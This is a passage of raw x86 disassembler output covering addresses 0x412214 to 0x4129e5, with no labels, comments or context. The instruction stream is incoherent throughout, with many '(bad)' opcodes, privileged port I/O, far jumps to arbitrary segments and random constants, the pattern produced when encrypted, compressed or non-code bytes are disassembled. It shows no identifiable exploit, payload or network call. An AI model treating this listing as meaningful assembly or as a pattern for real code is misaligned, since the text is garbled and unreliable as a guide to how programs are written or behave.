  412214:	ins    DWORD PTR es:[edi],dx
  412215:	sbb    eax,0xc6d2fe2a
  41221a:	ret    0x64ca
  41221d:	stos   BYTE PTR es:[edi],al
  41221e:	add    BYTE PTR [edx],ah
  412220:	mov    ds:0x1a29978e,al
  412225:	xor    eax,0x102732a0
  41222a:	out    0x8b,eax
  41222c:	pop    ds
  41222d:	sbb    al,bh
  41222f:	faddp  st(3),st
  412231:	gs mov edx,gs
  412234:	or     eax,0x79b744bc
  412239:	in     eax,dx
  41223a:	sbb    BYTE PTR [ecx+0x5f45a2bf],bl
  412240:	add    bh,BYTE PTR [edx-0x6f]
  412243:	push   ss
  412244:	or     ebp,DWORD PTR [esi+0x4a61c3d]
  41224a:	(bad)  
  41224c:	mov    ecx,0xc7e0fcc1
  412251:	push   cs
  412252:	adc    DWORD PTR [ebp+0x4d097ac1],edi
  412258:	cmp    BYTE PTR [eax+0x7e],dl
  41225b:	xchg   ebp,eax
  41225c:	dec    ebx
  41225d:	daa    
  41225e:	mov    dh,0x1a
  412260:	sbb    BYTE PTR [edx-0x3e],bh
  412263:	mov    dl,0x46
  412265:	mov    DWORD PTR [esp+eax*4-0x67],eax
  412269:	cmp    ebx,DWORD PTR [ebx-0x5c]
  41226c:	out    0x2e,eax
  41226e:	lods   eax,DWORD PTR ds:[esi]
  41226f:	add    BYTE PTR [esi-0x6bbba601],cl
  412275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412276:	stc    
  412277:	pop    edx
  412278:	xlat   BYTE PTR ds:[ebx]
  412279:	sahf   
  41227a:	jae    0x41223d
  41227c:	daa    
  41227d:	dec    esi
  41227e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41227f:	dec    edx
  412280:	mov    DWORD PTR [ecx-0x797e493f],esp
  412286:	vpslld xmm1,xmm2,XMMWORD PTR [edx-0x59]
  41228b:	cmp    edx,DWORD PTR [eax-0x49]
  41228e:	hlt    
  41228f:	jbe    0x4122e6
  412291:	outs   dx,BYTE PTR cs:[esi]
  412293:	fnsave [edi+0x4b]
  412296:	sub    al,0x5f
  412298:	sub    eax,0xfd7b3aa3
  41229d:	stos   BYTE PTR es:[edi],al
  41229e:	sbb    BYTE PTR [eax+0x214b8fc5],dl
  4122a4:	ret    
  4122a5:	cmp    dh,BYTE PTR gs:[esp+eiz*8+0x31]
  4122aa:	outs   dx,BYTE PTR ds:[esi]
  4122ab:	push   edi
  4122ac:	out    0x83,eax
  4122ae:	ds pop ss
  4122b0:	add    DWORD PTR [esi],ebp
  4122b2:	outs   dx,BYTE PTR ds:[esi]
  4122b3:	pop    ebp
  4122b4:	dec    edi
  4122b5:	jno    0x412239
  4122b7:	retf   
  4122b8:	and    al,0xd3
  4122ba:	in     eax,dx
  4122bb:	pop    ecx
  4122bc:	shr    cl,0xa8
  4122bf:	ja     0x41229b
  4122c1:	scas   al,BYTE PTR es:[edi]
  4122c2:	sub    edi,ebx
  4122c4:	lock and cl,BYTE PTR [edx+eax*4-0x4bf8e91b]
  4122cc:	pop    ss
  4122cd:	pop    esp
  4122ce:	push   ebx
  4122cf:	push   ss
  4122d0:	xchg   ecx,eax
  4122d1:	mov    ah,0xed
  4122d3:	add    al,0x89
  4122d5:	xor    al,0xfb
  4122d7:	pop    esi
  4122d8:	pop    es
  4122d9:	mov    bh,0xb8
  4122db:	fisttp DWORD PTR [ebx-0x5a]
  4122de:	xor    DWORD PTR [ecx+0x278ef556],ebp
  4122e4:	or     bl,ch
  4122e6:	idiv   edi
  4122e8:	xor    dl,al
  4122ea:	in     al,0x5
  4122ec:	pop    ss
  4122ed:	inc    ecx
  4122ee:	mov    ebp,0xec6a99a
  4122f3:	test   al,0x7d
  4122f5:	stc    
  4122f6:	loop   0x412327
  4122f8:	shr    WORD PTR [eax-0x448bc3c],1
  4122ff:	jg     0x41229b
  412301:	(bad)  
  412302:	inc    edx
  412303:	je     0x41233d
  412305:	mov    eax,0xe17c3905
  41230a:	mov    edx,0x62005177
  41230f:	add    DWORD PTR [ecx],eax
  412311:	fdiv   QWORD PTR fs:[esi-0x2a]
  412315:	jmp    0xe4ac:0x6b669b5a
  41231c:	push   edx
  41231d:	mov    eax,ds:0x9a2942e8
  412322:	mov    ecx,0xf92143db
  412327:	sub    edi,0xe8c9b3ab
  41232d:	inc    DWORD PTR [esi-0x22]
  412330:	std    
  412331:	cmp    al,ch
  412333:	and    edx,DWORD PTR [ebp+0x95b6c86]
  412339:	outs   dx,DWORD PTR ds:[esi]
  41233a:	not    bh
  41233c:	loopne 0x4123b0
  41233e:	mov    ecx,0xfa9a83c6
  412343:	sbb    eax,0xdaf35ce1
  412348:	xchg   esp,eax
  412349:	fstp   QWORD PTR [edi+0x6a0e247e]
  41234f:	pop    ebp
  412350:	sbb    eax,0x4a6b9536
  412355:	mov    esi,?
  412357:	inc    ecx
  412358:	ret    
  412359:	cmp    DWORD PTR [ebx-0x2fc1fd41],0x49711f68
  412363:	cmp    DWORD PTR [edx+0x75],esp
  412366:	or     eax,0xbacb1103
  41236b:	adc    al,0x87
  41236d:	mov    ss,ebp
  41236f:	pop    edx
  412370:	push   ebx
  412371:	(bad)  
  412372:	repz pop ss
  412374:	mov    ch,dh
  412376:	cdq    
  412377:	inc    ebx
  412378:	push   edx
  412379:	lea    ebp,[ecx-0x58749969]
  41237f:	mov    esi,DWORD PTR [esi-0x2f]
  412382:	stos   DWORD PTR es:[edi],eax
  412383:	lahf   
  412384:	mov    BYTE PTR [edi+ebp*8],ch
  412387:	xor    eax,0xc124388c
  41238c:	xchg   DWORD PTR [ebp-0x6218006],ecx
  412392:	sub    DWORD PTR [edx+ebx*2],esi
  412395:	xchg   edi,eax
  412396:	or     DWORD PTR ds:0x6fc04aa3,0x70
  41239d:	aam    0xc9
  41239f:	stc    
  4123a0:	or     cl,BYTE PTR [edi+0x47a25bf]
  4123a6:	mov    dh,0xb
  4123a8:	call   0x16bacfaf
  4123ad:	sahf   
  4123ae:	jb     0x412401
  4123b0:	pop    esi
  4123b1:	mov    dl,BYTE PTR [esp+esi*2+0x77]
  4123b5:	int3   
  4123b6:	scas   al,BYTE PTR es:[edi]
  4123b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123b8:	mov    WORD PTR [eax],gs
  4123ba:	fs xchg ecx,eax
  4123bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123bd:	pop    esp
  4123be:	mov    esi,DWORD PTR [ebx-0x12fca968]
  4123c4:	shl    DWORD PTR [ecx+0x9],cl
  4123c7:	icebp  
  4123c8:	pushf  
  4123c9:	xchg   ecx,eax
  4123ca:	fs mov edx,0x63d8efe6
  4123d0:	jb     0x412356
  4123d2:	cmc    
  4123d3:	je     0x4123e7
  4123d5:	(bad)  
  4123d6:	sub    ah,BYTE PTR [eax+0x51]
  4123d9:	lods   eax,DWORD PTR ds:[esi]
  4123da:	inc    edx
  4123db:	mov    ch,0x95
  4123dd:	jbe    0x4123d1
  4123df:	mov    bh,BYTE PTR [ebx+0x27]
  4123e2:	mov    BYTE PTR [ecx-0x59],dh
  4123e5:	push   ss
  4123e6:	das    
  4123e7:	sahf   
  4123e8:	ins    DWORD PTR es:[edi],dx
  4123e9:	add    BYTE PTR [edx-0xe],al
  4123ec:	ins    BYTE PTR es:[edi],dx
  4123ed:	or     ebp,edi
  4123ef:	sbb    ch,BYTE PTR [eax]
  4123f1:	cs adc bl,ch
  4123f4:	int3   
  4123f5:	sbb    bh,ah
  4123f7:	xor    ebx,DWORD PTR [edx]
  4123f9:	add    dh,0x0
  4123fc:	sbb    eax,0xc04dff1
  412401:	out    dx,al
  412402:	out    dx,eax
  412403:	fsub   DWORD PTR [ebp-0x40]
  412406:	jmp    0x12d2ff7
  41240b:	inc    BYTE PTR [esi-0x28206afc]
  412411:	xor    DWORD PTR [edi],edi
  412413:	rol    DWORD PTR [ebp-0x13bfe64a],cl
  412419:	and    al,0x75
  41241b:	xchg   BYTE PTR [edx-0x233c4440],bl
  412421:	xor    esi,esi
  412423:	add    eax,0x7489e474
  412428:	inc    edi
  412429:	push   0xffffffb2
  41242b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41242c:	imul   ebx,ebx,0x735401dd
  412432:	ins    BYTE PTR es:[edi],dx
  412433:	xor    DWORD PTR [ebx],edx
  412435:	data16 mov al,ds:0x7fa9552e
  41243b:	inc    esp
  41243c:	out    0xe7,al
  41243e:	leave  
  41243f:	ss aaa 
  412441:	popf   
  412442:	(bad)  
  412443:	ds xchg esp,eax
  412445:	mov    esi,ebx
  412447:	stos   DWORD PTR es:[edi],eax
  412448:	xchg   DWORD PTR [edi],esi
  41244a:	and    DWORD PTR [ebx],edx
  41244c:	add    al,0x4d
  41244e:	xchg   edi,eax
  41244f:	mov    edx,0xd1032a5b
  412454:	sbb    eax,0x25c47274
  412459:	hlt    
  41245a:	stos   DWORD PTR es:[edi],eax
  41245b:	ret    0x8ec3
  41245e:	dec    edx
  41245f:	and    BYTE PTR [ecx],ch
  412461:	push   ebx
  412462:	jg     0x4123ff
  412464:	push   ebx
  412465:	ret    
  412466:	retf   0x4777
  412469:	cmp    eax,0xf45601e7
  41246e:	xor    BYTE PTR [ebp-0x3248b9],ch
  412474:	xor    dh,BYTE PTR [ecx+0x3c]
  412477:	adc    al,0xa7
  412479:	(bad)  
  41247a:	sti    
  41247b:	fst    QWORD PTR [edx]
  41247d:	inc    esi
  41247e:	dec    ecx
  41247f:	sahf   
  412480:	pop    esi
  412481:	test   eax,0xc4eed189
  412486:	pop    ebx
  412487:	icebp  
  412488:	scas   eax,DWORD PTR es:[edi]
  412489:	cld    
  41248a:	jp     0x4124be
  41248c:	scas   eax,DWORD PTR es:[edi]
  41248d:	(bad)  [ebx-0x3ebed823]
  412493:	sti    
  412494:	fs inc edi
  412496:	imul   esp,DWORD PTR [esi],0xd89cba58
  41249c:	xchg   ecx,eax
  41249d:	in     eax,0x85
  41249f:	inc    esi
  4124a0:	imul   ecx,DWORD PTR [eax],0x5b7a7634
  4124a6:	ret    0xe054
  4124a9:	jno    0x4124b5
  4124ab:	inc    ecx
  4124ac:	ret    0x47f2
  4124af:	jp     0x412514
  4124b1:	fs xor al,0xb2
  4124b4:	repz out dx,eax
  4124b6:	sbb    ebx,DWORD PTR [esi+edx*1]
  4124b9:	push   ds
  4124ba:	stc    
  4124bb:	fldcw  WORD PTR [eax-0x7d]
  4124be:	xchg   edi,eax
  4124bf:	inc    esp
  4124c0:	jmp    0x682:0xdf07a132
  4124c7:	jo     0x412493
  4124c9:	cli    
  4124ca:	add    ecx,DWORD PTR [ebx+0x535007a3]
  4124d0:	retf   0x4f6f
  4124d3:	mov    bl,0x51
  4124d5:	pop    ss
  4124d6:	retf   
  4124d7:	sub    DWORD PTR [edx],edi
  4124d9:	push   cs
  4124da:	iret   
  4124db:	std    
  4124dc:	repnz ins DWORD PTR es:[edi],dx
  4124de:	in     al,0xd5
  4124e0:	jbe    0x4124e0
  4124e2:	add    al,0x39
  4124e4:	(bad)  
  4124e5:	sub    BYTE PTR [ebp+esi*1-0x74],ah
  4124e9:	call   0xee464d16
  4124ee:	cmp    esp,DWORD PTR [edx+ecx*1-0xe1c3402]
  4124f5:	pop    es
  4124f6:	ret    
  4124f7:	mov    edx,0x35efd72d
  4124fc:	imul   ecx,DWORD PTR [ecx+0x3f],0x46
  412500:	mov    es,edi
  412502:	test   eax,0xe35ef484
  412507:	aaa    
  412508:	mov    bh,0x1e
  41250a:	clc    
  41250b:	pop    esp
  41250c:	js     0x412514
  41250e:	jecxz  0x4124aa
  412510:	or     DWORD PTR [edi],esi
  412512:	es stos BYTE PTR es:[edi],al
  412514:	ins    BYTE PTR es:[edi],dx
  412515:	sbb    edi,ecx
  412517:	inc    ebx
  412518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412519:	aam    0xca
  41251b:	lods   al,BYTE PTR ds:[esi]
  41251c:	inc    ecx
  41251d:	rcl    BYTE PTR [edx+0x77],0x14
  412521:	mov    edi,0xb747a728
  412526:	je     0x4124fc
  412528:	mov    DWORD PTR [edx+0x5630f870],esp
  41252e:	ret    
  41252f:	mov    eax,0x9d7eb09b
  412534:	loop   0x4124fb
  412536:	repnz xor edi,edi
  412539:	ficomp DWORD PTR [eax+ebp*8-0x31]
  41253d:	outs   dx,DWORD PTR ds:[esi]
  41253e:	retf   
  41253f:	jmp    0x3d05:0xb8aec439
  412546:	dec    ebx
  412547:	test   bl,bh
  412549:	test   DWORD PTR [ecx+0x65d654dd],edi
  41254f:	cdq    
  412550:	jo     0x412592
  412552:	aas    
  412553:	arpl   WORD PTR [eax-0x5b1b72f0],si
  412559:	(bad)  
  41255a:	adc    eax,0xeb78ccce
  41255f:	inc    ebp
  412560:	call   0xd003:0xa9a6210e
  412567:	mov    bl,0xdf
  412569:	push   es
  41256a:	test   BYTE PTR [ebp-0x63],ch
  41256d:	pop    edi
  41256e:	push   esi
  41256f:	add    eax,0xb1bed4a7
  412574:	mov    DWORD PTR [eax-0x58ee7074],0x65631e40
  41257e:	and    DWORD PTR [ebx+0x35e2230],eax
  412584:	outs   dx,BYTE PTR ds:[esi]
  412585:	ret    
  412586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412587:	neg    DWORD PTR [edi+0x27144aa9]
  41258d:	call   0xcdd60643
  412592:	(bad)  
  412594:	out    dx,eax
  412595:	in     eax,0xa
  412597:	or     al,BYTE PTR [edx]
  412599:	lods   eax,DWORD PTR ds:[esi]
  41259a:	push   esp
  41259b:	sbb    ah,0xc2
  41259e:	xchg   edi,eax
  41259f:	or     eax,DWORD PTR [ecx+0x1e1fba14]
  4125a5:	jae    0x4125ef
  4125a7:	shr    BYTE PTR [edi],0xa6
  4125aa:	stc    
  4125ab:	jle    0x4125ab
  4125ad:	inc    esi
  4125ae:	add    ecx,DWORD PTR [esi+edx*4]
  4125b1:	xchg   ecx,eax
  4125b2:	mov    DWORD PTR [esi+esi*4],ebp
  4125b5:	jle    0x4125f6
  4125b7:	mov    BYTE PTR [esi+0x369c0565],cl
  4125bd:	push   cs
  4125be:	mov    ah,0xff
  4125c0:	mov    ch,0x4b
  4125c2:	xor    DWORD PTR [ebx-0x7c],0x46
  4125c6:	mov    ds:0x6863bcf0,al
  4125cb:	xchg   ebx,eax
  4125cc:	bound  ecx,QWORD PTR [eax+0x1525eecb]
  4125d2:	bound  ecx,QWORD PTR [edi+0x3eb084a0]
  4125d8:	adc    DWORD PTR [ebx+0x5],ecx
  4125db:	xlat   BYTE PTR ds:[ebx]
  4125dc:	pop    eax
  4125dd:	or     BYTE PTR [esi+edx*4],ah
  4125e0:	inc    edi
  4125e1:	adc    ebx,DWORD PTR [ecx]
  4125e3:	inc    ebx
  4125e4:	sahf   
  4125e5:	std    
  4125e6:	stos   BYTE PTR es:[edi],al
  4125e7:	out    dx,al
  4125e8:	(bad)  
  4125e9:	js     0x4125c8
  4125eb:	xor    cl,dh
  4125ed:	enter  0xf39a,0xa4
  4125f1:	push   esi
  4125f2:	push   ds
  4125f3:	add    ebx,esi
  4125f5:	sub    al,0xdf
  4125f7:	mov    ds:0xdd1abcbc,al
  4125fc:	or     BYTE PTR [ebx+0x68557208],0x7a
  412603:	out    dx,eax
  412604:	or     DWORD PTR [ecx+0x6e742563],eax
  41260a:	sub    al,ah
  41260c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260d:	cmp    eax,0x6d3127e9
  412612:	(bad)  [esi+0x5d]
  412615:	mov    dl,0xec
  412617:	popf   
  412618:	mov    dl,0x83
  41261a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41261b:	xchg   esi,eax
  41261c:	pop    ds
  41261d:	jnp    0x4125cb
  41261f:	ds mov ecx,0xeb111f52
  412625:	push   eax
  412626:	mov    bl,0xed
  412628:	mul    BYTE PTR [ebp-0x70]
  41262b:	je     0x4125af
  41262d:	in     eax,0x8d
  41262f:	mov    al,0x90
  412631:	sti    
  412632:	pop    edx
  412633:	ss mov cl,0x7
  412636:	dec    esp
  412637:	inc    esp
  412638:	int    0xf
  41263a:	out    0xc1,al
  41263c:	ins    DWORD PTR es:[edi],dx
  41263d:	test   edx,eax
  41263f:	test   BYTE PTR [esi],dh
  412641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412642:	sahf   
  412643:	cmp    BYTE PTR [edx],bh
  412645:	adc    BYTE PTR [edi+0x2f825a9a],ah
  41264b:	pop    esi
  41264c:	ins    DWORD PTR es:[edi],dx
  41264d:	sub    al,0xed
  41264f:	ror    DWORD PTR [ebx+0x35],cl
  412652:	adc    eax,0xbd0ee33e
  412657:	iret   
  412658:	sub    al,0x92
  41265a:	mov    dh,0x36
  41265c:	scas   al,BYTE PTR es:[edi]
  41265d:	mov    bl,0x4f
  41265f:	outs   dx,BYTE PTR ds:[esi]
  412660:	add    BYTE PTR [esi+0xfd6e2df],cl
  412666:	add    esi,DWORD PTR [edi+0x4542dc0a]
  41266c:	adc    cl,BYTE PTR cs:[eax+ebx*2+0x0]
  412671:	push   ebp
  412672:	or     al,0x8a
  412674:	cli    
  412675:	adc    eax,0x6dc284b1
  41267a:	cmp    ch,dl
  41267c:	dec    eax
  41267d:	sbb    WORD PTR [esi-0x5],0xa058
  412683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412684:	jg     0x4126e5
  412686:	pop    ebp
  412687:	dec    eax
  412688:	and    DWORD PTR [esi-0x5540de73],0x2a
  41268f:	ja     0x412684
  412691:	cdq    
  412692:	lea    esp,[eax+0x4b]
  412695:	ins    BYTE PTR es:[edi],dx
  412696:	rcr    BYTE PTR [ebx],1
  412698:	mov    bh,0xdb
  41269a:	push   0x3d
  41269c:	mov    eax,0x82c01714
  4126a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a2:	ficom  DWORD PTR [ebx-0x4f8a7b18]
  4126a8:	ins    BYTE PTR es:[edi],dx
  4126a9:	shr    BYTE PTR [eax-0x5c],1
  4126ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ad:	pop    ss
  4126ae:	repz dec ebp
  4126b0:	dec    ebp
  4126b1:	out    dx,eax
  4126b2:	sbb    al,0x59
  4126b4:	jmp    0x412656
  4126b6:	sub    ecx,DWORD PTR [ecx]
  4126b8:	jb     0x4126f3
  4126ba:	out    dx,eax
  4126bb:	fild   DWORD PTR [edx]
  4126bd:	push   ebp
  4126be:	ret    0x6423
  4126c1:	cdq    
  4126c2:	xchg   DWORD PTR [ebp-0x578e29e7],eax
  4126c8:	cwde   
  4126c9:	mov    ebx,0x7826ec44
  4126ce:	push   ebp
  4126cf:	fwait
  4126d0:	or     edi,DWORD PTR [ebx-0x7d54df69]
  4126d6:	lock and eax,0xd6c4591a
  4126dc:	mov    dl,cl
  4126de:	icebp  
  4126df:	test   eax,0x6e7ec5e3
  4126e4:	int    0xe2
  4126e6:	mov    al,ds:0x119a789b
  4126eb:	not    DWORD PTR [edx+0xb]
  4126ee:	adc    DWORD PTR [eax],esp
  4126f0:	cmp    eax,0x73c1d157
  4126f5:	sbb    edx,DWORD PTR [ebp*2+0x1d215389]
  4126fc:	and    BYTE PTR [ecx+0x40a3fada],0x93
  412703:	ret    0x6795
  412706:	add    BYTE PTR [ecx],ah
  412708:	sub    eax,0x62dc3fbc
  41270d:	push   ds
  41270e:	add    al,ch
  412710:	(bad)  
  412711:	mov    BYTE PTR [ebx+0xc26039d],bl
  412717:	into   
  412718:	mov    ecx,0x5331326d
  41271d:	or     dh,BYTE PTR [eax+edx*4+0x19]
  412721:	fisub  DWORD PTR [ecx+0xbbdd1bc]
  412727:	xchg   ebx,eax
  412728:	push   edi
  412729:	lahf   
  41272a:	lds    ebx,FWORD PTR [edi+0x79b8955d]
  412730:	dec    edi
  412731:	mov    eax,0x4fb5ed41
  412736:	xchg   DWORD PTR [edi],ebx
  412738:	retf   0x4e43
  41273b:	gs jbe 0x412701
  41273e:	mov    edi,0x110cac
  412743:	fs dec ebp
  412745:	ins    BYTE PTR es:[edi],dx
  412746:	jae    0x4488220f
  41274c:	cmp    edi,ecx
  41274e:	aad    0x54
  412750:	test   eax,0x8fbe69c7
  412755:	mov    dl,0xbc
  412757:	mov    al,0xf8
  412759:	nop
  41275a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41275b:	fmul   DWORD PTR [ebx+0x3c9f17bc]
  412761:	mov    ch,0x22
  412763:	mov    ss,edi
  412765:	xor    eax,0xe74fa2c5
  41276a:	mov    ecx,ebp
  41276c:	aaa    
  41276d:	add    eax,0xda5a4c5
  412772:	add    eax,0x8e51232c
  412777:	call   0x59789ec6
  41277c:	mov    ds:0x78f4ac30,eax
  412781:	stos   DWORD PTR es:[edi],eax
  412782:	hlt    
  412783:	mov    ds:0x9eaf3f46,eax
  412788:	mov    eax,ds:0xa197a261
  41278d:	jecxz  0x4127f1
  41278f:	xchg   ebp,eax
  412790:	jecxz  0x412737
  412792:	dec    ebp
  412793:	push   esp
  412794:	add    DWORD PTR [ebp+0x49cd7346],ebx
  41279a:	push   esp
  41279b:	cdq    
  41279c:	xchg   esp,eax
  41279d:	xchg   ch,bl
  41279f:	je     0x4127ff
  4127a1:	ret    0x9acc
  4127a4:	dec    esp
  4127a5:	in     eax,dx
  4127a6:	push   ecx
  4127a7:	loopne 0x412731
  4127a9:	mov    esi,0xf5d398d3
  4127ae:	cdq    
  4127af:	gs pop ss
  4127b1:	xor    eax,0xe23a5d22
  4127b6:	xor    BYTE PTR [edi],dh
  4127b8:	inc    ecx
  4127b9:	push   edx
  4127ba:	mov    cl,0xca
  4127bc:	dec    ebx
  4127bd:	add    al,0xa4
  4127bf:	bound  esi,QWORD PTR [eax+0x29]
  4127c2:	daa    
  4127c3:	xchg   esi,eax
  4127c4:	xchg   edx,eax
  4127c5:	cmc    
  4127c6:	push   ebp
  4127c7:	inc    ebx
  4127c8:	add    DWORD PTR [edi-0x24],edx
  4127cb:	(bad)  [esi+ebx*1-0xa]
  4127cf:	adc    DWORD PTR [esi+0x39],0xaa52404d
  4127d6:	cmp    BYTE PTR [eax+0x46],0xaa
  4127da:	shr    ebp,cl
  4127dc:	and    edx,DWORD PTR [ecx+eiz*4]
  4127df:	sub    eax,0xe55a46fb
  4127e4:	sbb    BYTE PTR [ebx-0x45],ah
  4127e7:	adc    BYTE PTR [ebx+0x52f02dbc],ch
  4127ed:	(bad)  
  4127f1:	add    eax,0x3e747a6
  4127f6:	ins    DWORD PTR es:[edi],dx
  4127f7:	ret    0xcd13
  4127fa:	push   esi
  4127fb:	add    BYTE PTR [edx],ah
  4127fd:	pop    ecx
  4127fe:	xlat   BYTE PTR ds:[ebx]
  4127ff:	popa   
  412800:	push   ss
  412801:	or     eax,0xe27a7e4a
  412806:	inc    esi
  412807:	repz and al,0x28
  41280a:	sub    ecx,DWORD PTR [esi+edx*4]
  41280d:	inc    ebp
  41280e:	and    edx,DWORD PTR [ebx]
  412810:	adc    al,0xb9
  412812:	ret    0xfbf0
  412815:	enter  0xe9b,0x14
  412819:	xchg   ch,bl
  41281b:	loope  0x4127c1
  41281d:	mov    ebx,ebp
  41281f:	jmp    0x58f6:0xa0eeb384
  412826:	mov    ch,cl
  412828:	xchg   ebp,eax
  412829:	int3   
  41282a:	lock (bad) 
  41282c:	loop   0x412838
  41282e:	dec    esi
  41282f:	loope  0x41288e
  412831:	and    al,0x75
  412833:	cmc    
  412834:	enter  0x8fd8,0x9d
  412838:	ror    DWORD PTR [edi],1
  41283a:	cmp    cl,BYTE PTR [esi+0x1f]
  41283d:	dec    edi
  41283e:	mov    ds:0x9af1a723,al
  412843:	push   esi
  412844:	sbb    edi,DWORD PTR [esp+ebx*8]
  412847:	out    dx,al
  412848:	cmp    al,BYTE PTR [eax-0x6c33f0c]
  41284e:	mov    bh,0x2c
  412850:	int    0xf9
  412852:	stos   DWORD PTR es:[edi],eax
  412853:	xor    BYTE PTR [ebp-0x67],0x3
  412857:	jp     0x4128b6
  412859:	mov    edx,0x99a24598
  41285e:	ret    0xab80
  412861:	test   eax,0xbbb36693
  412866:	ficomp WORD PTR [ebx-0x64]
  412869:	stos   BYTE PTR es:[edi],al
  41286a:	stos   BYTE PTR es:[edi],al
  41286b:	int3   
  41286c:	(bad)  
  41286d:	and    al,0xf0
  41286f:	retf   
  412870:	sbb    al,0xb1
  412872:	xchg   esi,eax
  412873:	pusha  
  412874:	mov    WORD PTR ds:0xab69a0ba,?
  41287a:	cmc    
  41287b:	mov    cl,0xa2
  41287d:	jl     0x4128dc
  41287f:	popa   
  412880:	repnz addr16 nop
  412883:	dec    edi
  412884:	sahf   
  412885:	fwait
  412886:	in     al,dx
  412887:	pop    edx
  412888:	fimul  DWORD PTR [ebx+eax*4+0x57]
  41288c:	fwait
  41288d:	call   0xb621c5fe
  412892:	and    ebp,DWORD PTR [ebx]
  412894:	loopne 0x41281e
  412896:	sti    
  412897:	call   0xeb51e109
  41289c:	fdivr  QWORD PTR [ecx+0x225f2516]
  4128a2:	push   ebx
  4128a3:	ror    ecx,1
  4128a5:	not    BYTE PTR [edi+ebx*1-0x3c97691b]
  4128ac:	mul    BYTE PTR [eax]
  4128ae:	mov    bh,0xa
  4128b0:	test   eax,0xf006f8d
  4128b5:	imul   esp,DWORD PTR [eax-0x1babd00f],0x71
  4128bc:	out    0x1a,al
  4128be:	xor    DWORD PTR [ebx+0x6f],edi
  4128c1:	xchg   ecx,eax
  4128c2:	xor    ecx,eax
  4128c4:	and    al,0x49
  4128c6:	in     al,dx
  4128c7:	add    al,0x77
  4128c9:	xchg   esp,eax
  4128ca:	jmp    0x4128c5
  4128cc:	neg    eax
  4128ce:	jmp    0xe78fcf3d
  4128d3:	(bad)  
  4128d4:	arpl   bp,di
  4128d6:	jle    0x4128ef
  4128d8:	call   0xa291:0x8b066a98
  4128df:	xchg   ebx,eax
  4128e0:	test   al,0xb8
  4128e2:	xor    ah,0x0
  4128e5:	retf   
  4128e6:	dec    edi
  4128e7:	jl     0x41294a
  4128e9:	data16 jmp 0x412946
  4128ec:	sub    eax,0x39ed2a12
  4128f1:	jecxz  0x41292e
  4128f3:	add    ch,ch
  4128f5:	ds xor ebx,esp
  4128f8:	jmp    0x4128df
  4128fa:	jmp    0x41294f
  4128fc:	in     al,dx
  4128fd:	xchg   esi,eax
  4128fe:	add    DWORD PTR [ebp-0x119d197e],eax
  412904:	jge    0x412940
  412906:	scas   eax,DWORD PTR es:[edi]
  412907:	push   es
  412908:	iret   
  412909:	push   eax
  41290a:	mov    bl,0x6d
  41290c:	sahf   
  41290d:	pusha  
  41290e:	outs   dx,DWORD PTR ds:[esi]
  41290f:	jne    0x4128b3
  412911:	jbe    0x41293c
  412913:	mov    cl,0xce
  412915:	mov    esi,DWORD PTR [eax]
  412917:	mov    bh,0x6a
  412919:	mov    ch,0xb1
  41291b:	mov    esi,0x48e57683
  412920:	popf   
  412921:	cmp    DWORD PTR [ecx],0xb39b194f
  412927:	lds    edx,FWORD PTR ds:0xe1f9fc7a
  41292d:	sbb    eax,0x7bd45838
  412932:	xor    BYTE PTR [ebx],ch
  412934:	idiv   ah
  412936:	imul   bl
  412938:	push   ss
  412939:	or     bl,BYTE PTR [eax]
  41293b:	arpl   WORD PTR [ecx+0x24],bp
  41293e:	rcl    BYTE PTR [edi-0xe01f402],1
  412944:	xchg   edi,eax
  412945:	xor    DWORD PTR [ecx],ebp
  412947:	ja     0x4128df
  412949:	mov    gs,WORD PTR ds:0xbdb1def7
  41294f:	repnz cld 
  412951:	pop    ss
  412952:	int    0x5b
  412954:	pop    esi
  412955:	cld    
  412956:	and    edi,ebp
  412958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412959:	out    dx,eax
  41295a:	fucom  st(4)
  41295c:	std    
  41295d:	adc    esi,DWORD PTR [ebx]
  41295f:	jns    0x4129bc
  412961:	scas   al,BYTE PTR es:[edi]
  412962:	out    dx,al
  412963:	das    
  412964:	(bad)  
  412965:	push   ecx
  412966:	ret    
  412967:	fldenv [esi-0x58]
  41296a:	std    
  41296b:	int    0x62
  41296d:	mov    ch,0x89
  41296f:	pop    esp
  412970:	retf   0x1699
  412973:	xchg   BYTE PTR [esi],bl
  412975:	mov    ss:0x68ffc2b1,eax
  41297b:	or     al,0xaf
  41297d:	mov    edx,0xa96bbcac
  412982:	(bad)  
  412983:	jp     0x4129ee
  412985:	loopne 0x412a00
  412987:	xor    BYTE PTR [ebp-0x73],bh
  41298a:	es sbb eax,0x2354897
  412990:	imul   ebp,DWORD PTR [ebx-0x54],0x35
  412994:	fs mov dl,0x91
  412997:	call   0xdcdf:0x3b8d40cb
  41299e:	sub    al,0xc1
  4129a0:	mov    dh,0x59
  4129a2:	inc    ecx
  4129a3:	fst    st(4)
  4129a5:	mov    esp,0x411b9f0
  4129aa:	push   es
  4129ab:	jl     0x412986
  4129ad:	fidivr DWORD PTR [ebp+ebp*8-0x161ac030]
  4129b4:	adc    edx,DWORD PTR [eax+edx*8-0x5b]
  4129b8:	test   BYTE PTR [edx-0x7d1c84a7],bh
  4129be:	std    
  4129bf:	xchg   ebx,eax
  4129c0:	in     eax,dx
  4129c1:	add    BYTE PTR [esi-0x63],dh
  4129c4:	js     0x412a24
  4129c6:	mov    al,ds:0x603ee126
  4129cb:	add    BYTE PTR [esi+0x44],dh
  4129ce:	inc    esp
  4129cf:	lods   eax,DWORD PTR ds:[esi]
  4129d0:	jb     0x412a41
  4129d2:	push   ecx
  4129d3:	fs push 0xd0932b66
  4129d9:	hlt    
  4129da:	push   ecx
  4129db:	push   0x7a854cc1
  4129e0:	mov    edx,0x81ae148d
  4129e5:	dec    ecx
